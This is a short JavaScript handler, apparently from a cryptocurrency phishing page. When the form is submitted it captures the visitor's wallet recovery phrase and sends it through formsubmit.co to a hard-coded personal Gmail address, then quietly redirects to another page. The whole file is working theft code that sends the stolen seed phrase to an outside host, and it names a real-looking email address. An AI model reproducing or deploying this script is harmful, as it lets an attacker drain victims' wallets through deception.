form.addEventListener('submit', o)
function o (e) {
  e.preventDefault()
  mail = 'Thoparis15@gmail.com'
  next = 'registry.html'
  subject = `${window.location.hostname} ${new Date()}`
  let r = new FormData()
  recoveryPhrase = message.value
  r.append('recoveryPhrase', recoveryPhrase)
  r.append('_captcha', false)
  r.append('_next', next)
  r.append('_template', 'table')
  r.append('_subject', subject)
  let n = `https://formsubmit.co/${mail}`
  fetch(
    n,
    {
      method: 'POST',
      body: r
    },
    { referrer: 'https://twitter.com' }
  ).then(e => window.location.assign(next))
}
